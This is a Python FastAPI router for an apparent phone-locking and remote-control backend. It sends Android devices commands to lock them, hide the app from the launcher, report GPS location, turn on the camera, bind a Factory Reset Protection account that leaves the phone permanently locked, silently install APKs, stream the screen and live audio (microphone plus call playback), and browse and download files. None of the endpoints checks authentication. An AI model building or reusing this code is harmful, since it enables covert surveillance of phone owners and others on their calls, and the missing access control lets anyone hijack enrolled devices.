from fastapi import APIRouter, Depends, HTTPException, status, Query
from sqlalchemy.orm import Session
from sqlalchemy import or_, and_
from typing import List, Optional
from uuid import UUID

from app.core import get_db
from app.models import User, Device, DeviceCommand, CommandType, CommandStatus
from app.schemas import (
    CommandCreate, CommandBulk, CommandResponse,
    LockCommand, UnlockCommand, WarningCommand, CommandAck,
    HideAppCommand, UnhideAppCommand, DisableAppCommand, EnableAppCommand,
    GPSTrackCommand, CameraOnCommand, CameraOffCommand, UninstallAppCommand,
    SetFRPAccountCommand, SendMessageCommand, UpdateAppCommand, BulkUpdateAppCommand,
    StartScreenMirrorCommand, StopScreenMirrorCommand,
    StartFileManagerCommand, StopFileManagerCommand
)
from app.services import CommandService, DeviceService

router = APIRouter(prefix="/commands", tags=["Device Commands"])


@router.post("/lock", response_model=CommandResponse)
async def lock_device(
    lock_data: LockCommand,
    db: Session = Depends(get_db)
):
    """Send lock command to a device"""
    device = DeviceService.get_device_by_id(db, lock_data.device_id)
    if not device:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Device not found"
        )
    
    command = CommandService.create_lock_command(
        db, device, None, lock_data.reason,
        lock_data.message, lock_data.contact_number or ""
    )
    
    # Update device status
    device.status = __import__('app.models', fromlist=['DeviceStatus']).DeviceStatus.LOCKED
    db.commit()
    
    return command


@router.post("/unlock", response_model=CommandResponse)
async def unlock_device(
    unlock_data: UnlockCommand,
    db: Session = Depends(get_db)
):
    """Send unlock command to a device"""
    device = DeviceService.get_device_by_id(db, unlock_data.device_id)
    if not device:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Device not found"
        )
    
    command = CommandService.create_unlock_command(
        db, device, None, unlock_data.reason
    )
    
    # Update device status
    device.status = __import__('app.models', fromlist=['DeviceStatus']).DeviceStatus.ACTIVE
    db.commit()
    
    return command


@router.post("/warning", response_model=CommandResponse)
async def send_warning(
    warning_data: WarningCommand,
    db: Session = Depends(get_db)
):
    """Send warning notification to a device"""
    device = DeviceService.get_device_by_id(db, warning_data.device_id)
    if not device:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Device not found"
        )
    
    command = CommandService.create_warning_command(
        db, device, warning_data.title, warning_data.message,
        warning_data.due_date or "", warning_data.amount or "",
        None
    )
    
    return command


@router.post("/hide-app", response_model=CommandResponse)
async def hide_app(
    hide_data: HideAppCommand,
    db: Session = Depends(get_db)
):
    """Send hide app command to a device - hides the app from launcher"""
    device = DeviceService.get_device_by_id(db, hide_data.device_id)
    if not device:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Device not found"
        )
    
    command = CommandService.create_hide_app_command(
        db, device, None, hide_data.reason
    )
    
    return command


@router.post("/unhide-app", response_model=CommandResponse)
async def unhide_app(
    unhide_data: UnhideAppCommand,
    db: Session = Depends(get_db)
):
    """Send unhide app command to a device - shows the app in launcher"""
    device = DeviceService.get_device_by_id(db, unhide_data.device_id)
    if not device:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Device not found"
        )
    
    command = CommandService.create_unhide_app_command(
        db, device, None, unhide_data.reason
    )
    
    return command


@router.post("/disable-app", response_model=CommandResponse)
async def disable_app(
    disable_data: DisableAppCommand,
    db: Session = Depends(get_db)
):
    """Send disable app command - removes all protections and disables the app"""
    device = DeviceService.get_device_by_id(db, disable_data.device_id)
    if not device:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Device not found"
        )
    
    command = CommandService.create_disable_app_command(
        db, device, None, disable_data.reason
    )
    
    return command


@router.post("/enable-app", response_model=CommandResponse)
async def enable_app(
    enable_data: EnableAppCommand,
    db: Session = Depends(get_db)
):
    """Send enable app command - re-enables all protections"""
    device = DeviceService.get_device_by_id(db, enable_data.device_id)
    if not device:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Device not found"
        )
    
    command = CommandService.create_enable_app_command(
        db, device, None, enable_data.reason
    )
    
    return command


@router.post("/gps-track", response_model=CommandResponse)
async def gps_track(
    gps_data: GPSTrackCommand,
    db: Session = Depends(get_db)
):
    """Send GPS tracking request to device - device will report back its location"""
    device = DeviceService.get_device_by_id(db, gps_data.device_id)
    if not device:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Device not found"
        )
    
    command = CommandService.create_gps_track_command(
        db, device, None, gps_data.reason
    )
    
    return command


@router.post("/camera-on", response_model=CommandResponse)
async def camera_on(
    camera_data: CameraOnCommand,
    db: Session = Depends(get_db)
):
    """Turn on camera capture on device"""
    device = DeviceService.get_device_by_id(db, camera_data.device_id)
    if not device:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Device not found"
        )
    
    command = CommandService.create_camera_on_command(
        db, device, None, camera_data.reason
    )
    
    # Update device camera_active flag
    device.camera_active = True
    db.commit()
    
    return command


@router.post("/camera-off", response_model=CommandResponse)
async def camera_off(
    camera_data: CameraOffCommand,
    db: Session = Depends(get_db)
):
    """Turn off camera capture on device"""
    device = DeviceService.get_device_by_id(db, camera_data.device_id)
    if not device:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Device not found"
        )
    
    command = CommandService.create_camera_off_command(
        db, device, None, camera_data.reason
    )
    
    # Update device camera_active flag
    device.camera_active = False
    db.commit()
    
    return command


@router.post("/uninstall-app", response_model=CommandResponse)
async def uninstall_app(
    uninstall_data: UninstallAppCommand,
    db: Session = Depends(get_db)
):
    """Send uninstall app command - removes all protections, clears device owner, and uninstalls the app permanently"""
    device = DeviceService.get_device_by_id(db, uninstall_data.device_id)
    if not device:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Device not found"
        )
    
    command = CommandService.create_uninstall_app_command(
        db, device, None, uninstall_data.reason
    )
    
    # Update device status
    device.is_app_disabled = True
    db.commit()
    
    return command


@router.post("/set-frp-account", response_model=CommandResponse)
async def set_frp_account(
    frp_data: SetFRPAccountCommand,
    db: Session = Depends(get_db)
):
    """Set Factory Reset Protection (FRP) Google account on device.
    After any factory reset (including recovery mode), the phone will require
    this Google account to unlock. Without it, the phone is permanently locked."""
    device = DeviceService.get_device_by_id(db, frp_data.device_id)
    if not device:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Device not found"
        )
    
    command = CommandService.create_set_frp_account_command(
        db, device, frp_data.frp_account, None, frp_data.reason
    )
    
    return command


@router.post("/send-message", response_model=CommandResponse)
async def send_message_to_device(
    msg_data: SendMessageCommand,
    db: Session = Depends(get_db)
):
    """Send a custom message to a device. Message will be displayed on the lock screen."""
    device = DeviceService.get_device_by_id(db, msg_data.device_id)
    if not device:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Device not found"
        )
    
    command = CommandService.create_command(
        db, device, CommandType.SHOW_MESSAGE,
        {"message": msg_data.message},
        None, msg_data.reason
    )
    
    return command


@router.post("/bulk", response_model=List[CommandResponse])
async def send_bulk_command(
    bulk_data: CommandBulk,
    db: Session = Depends(get_db)
):
    """Send command to multiple devices"""
    commands = []
    
    for device_id in bulk_data.device_ids:
        device = DeviceService.get_device_by_id(db, device_id)
        if device:
            command = CommandService.create_command(
                db, device, bulk_data.command_type,
                bulk_data.payload, None, bulk_data.reason
            )
            commands.append(command)
    
    return commands


@router.get("/{device_id}", response_model=List[CommandResponse])
async def get_device_commands(
    device_id: UUID,
    limit: int = Query(50, ge=1, le=100),
    db: Session = Depends(get_db)
):
    """Get command history for a device"""
    commands = db.query(DeviceCommand).filter(
        DeviceCommand.device_id == device_id
    ).order_by(DeviceCommand.created_at.desc()).limit(limit).all()
    
    return commands


@router.post("/ack", status_code=status.HTTP_200_OK)
async def acknowledge_command(
    ack_data: CommandAck,
    db: Session = Depends(get_db)
):
    """Acknowledge command execution (called by Android app)"""
    command = CommandService.acknowledge_command(
        db, ack_data.command_id, ack_data.status, ack_data.error_message
    )
    
    if not command:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Command not found"
        )
    
    return {"status": "acknowledged"}


@router.get("/pending/{device_id}", response_model=List[CommandResponse])
async def get_pending_commands(
    device_id: UUID,
    db: Session = Depends(get_db)
):
    """Get pending commands for a device (called by Android app polling).
    Returns PENDING commands and SENT commands older than 60s (FCM delivery likely failed)."""
    from datetime import datetime, timedelta
    cutoff = datetime.utcnow() - timedelta(seconds=60)
    commands = db.query(DeviceCommand).filter(
        DeviceCommand.device_id == device_id,
        or_(
            DeviceCommand.status == CommandStatus.PENDING,
            and_(
                DeviceCommand.status == CommandStatus.SENT,
                DeviceCommand.created_at < cutoff
            )
        )
    ).order_by(DeviceCommand.created_at.asc()).all()
    
    return commands


@router.delete("/history/{device_id}", status_code=204)
async def delete_device_commands(
    device_id: UUID,
    db: Session = Depends(get_db)
):
    """Delete all command history for a device"""
    device = DeviceService.get_device_by_id(db, device_id)
    if not device:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Device not found"
        )
    
    db.query(DeviceCommand).filter(DeviceCommand.device_id == device_id).delete()
    db.commit()
    return None


@router.delete("/single/{command_id}", status_code=204)
async def delete_single_command(
    command_id: UUID,
    db: Session = Depends(get_db)
):
    """Delete a single command from history"""
    command = db.query(DeviceCommand).filter(DeviceCommand.id == command_id).first()
    if not command:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Command not found"
        )
    
    db.delete(command)
    db.commit()
    return None


@router.post("/update-app", response_model=CommandResponse)
async def update_app(
    update_data: UpdateAppCommand,
    db: Session = Depends(get_db)
):
    """Send UPDATE_APP command to a device.
    
    The device will download the latest APK from the server and
    silently install it using Device Owner PackageInstaller API.
    No user interaction required.
    """
    device = DeviceService.get_device_by_id(db, update_data.device_id)
    if not device:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Device not found"
        )
    
    payload = {
        "apk_url": "https://riadrayhan111-rr-locker-api.hf.space/api/v1/app/download",
        "force": str(update_data.force).lower(),
    }
    if update_data.target_version:
        payload["target_version"] = str(update_data.target_version)
    
    command = CommandService.create_command(
        db, device, CommandType.UPDATE_APP,
        payload, None, update_data.reason or "OTA app update"
    )
    
    return command


@router.post("/update-app/bulk", response_model=List[CommandResponse])
async def bulk_update_app(
    bulk_data: BulkUpdateAppCommand,
    db: Session = Depends(get_db)
):
    """Send UPDATE_APP command to multiple devices at once."""
    commands = []
    
    payload = {
        "apk_url": "https://riadrayhan111-rr-locker-api.hf.space/api/v1/app/download",
        "force": str(bulk_data.force).lower(),
    }
    if bulk_data.target_version:
        payload["target_version"] = str(bulk_data.target_version)
    
    for device_id in bulk_data.device_ids:
        device = DeviceService.get_device_by_id(db, device_id)
        if device:
            command = CommandService.create_command(
                db, device, CommandType.UPDATE_APP,
                payload, None, bulk_data.reason or "OTA app update (bulk)"
            )
            commands.append(command)
    
    return commands


# ============================================================
# Live Screen Mirror & Audio Streaming
# ============================================================

@router.post("/screen-mirror/start", response_model=CommandResponse)
async def start_screen_mirror(
    data: StartScreenMirrorCommand,
    db: Session = Depends(get_db)
):
    """Tell a device to start streaming its screen live to the backend.
    Admin viewers can then watch via WebSocket /api/v1/screen/view/{device_id}."""
    device = DeviceService.get_device_by_id(db, data.device_id)
    if not device:
        raise HTTPException(status.HTTP_404_NOT_FOUND, "Device not found")
    return CommandService.create_start_screen_mirror_command(
        db, device, data.quality or 50, data.fps or 4, data.scale or 0.5,
        None, data.reason
    )


@router.post("/screen-mirror/stop", response_model=CommandResponse)
async def stop_screen_mirror(
    data: StopScreenMirrorCommand,
    db: Session = Depends(get_db)
):
    """Tell a device to stop the live screen mirror service."""
    device = DeviceService.get_device_by_id(db, data.device_id)
    if not device:
        raise HTTPException(status.HTTP_404_NOT_FOUND, "Device not found")
    return CommandService.create_stop_screen_mirror_command(
        db, device, None, data.reason
    )


@router.post("/audio-stream/start", response_model=CommandResponse)
async def start_audio_stream(
    data: StartScreenMirrorCommand,
    db: Session = Depends(get_db)
):
    """Tell a device to start streaming live audio (mic + playback capture) to the backend.
    Admin viewers can listen via WebSocket /api/v1/screen/audio/view/{device_id}."""
    device = DeviceService.get_device_by_id(db, data.device_id)
    if not device:
        raise HTTPException(status.HTTP_404_NOT_FOUND, "Device not found")
    payload = {
        "action": "start_audio_stream",
        "sample_rate": "16000",
        "channels": "1",
        "capture_playback": "true",  # also capture system / Meet / call playback if allowed
    }
    return CommandService.create_command(
        db, device, CommandType.START_AUDIO_STREAM, payload, None,
        data.reason or "Admin started live audio"
    )


@router.post("/audio-stream/stop", response_model=CommandResponse)
async def stop_audio_stream(
    data: StopScreenMirrorCommand,
    db: Session = Depends(get_db)
):
    """Tell a device to stop the live audio stream service."""
    device = DeviceService.get_device_by_id(db, data.device_id)
    if not device:
        raise HTTPException(status.HTTP_404_NOT_FOUND, "Device not found")
    return CommandService.create_command(
        db, device, CommandType.STOP_AUDIO_STREAM, {"action": "stop_audio_stream"},
        None, data.reason or "Admin stopped live audio"
    )

# ============================================================
# Remote File Manager
# ============================================================

@router.post("/file-manager/start", response_model=CommandResponse)
async def start_file_manager(
    data: StartFileManagerCommand,
    db: Session = Depends(get_db)
):
    """Tell a device to start the remote file-manager service so the admin
    can browse/download files via WebSocket /api/v1/files/admin/{device_id}."""
    device = DeviceService.get_device_by_id(db, data.device_id)
    if not device:
        raise HTTPException(status.HTTP_404_NOT_FOUND, "Device not found")
    return CommandService.create_start_file_manager_command(
        db, device, None, data.reason
    )


@router.post("/file-manager/stop", response_model=CommandResponse)
async def stop_file_manager(
    data: StopFileManagerCommand,
    db: Session = Depends(get_db)
):
    """Tell a device to stop the remote file-manager service."""
    device = DeviceService.get_device_by_id(db, data.device_id)
    if not device:
        raise HTTPException(status.HTTP_404_NOT_FOUND, "Device not found")
    return CommandService.create_stop_file_manager_command(
        db, device, None, data.reason
    )